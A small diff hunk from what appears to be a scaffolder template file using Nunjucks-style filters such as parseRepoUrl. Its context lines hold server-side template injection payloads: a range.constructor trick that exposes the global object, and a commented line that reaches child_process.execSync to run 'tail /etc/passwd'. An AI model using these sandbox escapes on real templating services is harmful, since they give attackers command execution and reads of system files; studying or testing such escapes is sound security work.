@@ -20,7 +20,7 @@ ${{ range.constructor("let gg=global; delete gg.global;return gg")() | dump}}
 // range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()
 
 test:
-${{ 'https://my-host.com/my-owner/my-repo' | parseRepoUrl | dump }}
+eh 'https://my-host.com/my-owner/my-repo' | parseRepoUrl | dump
 
 ## Abstract
 ${{ values.abstract }}
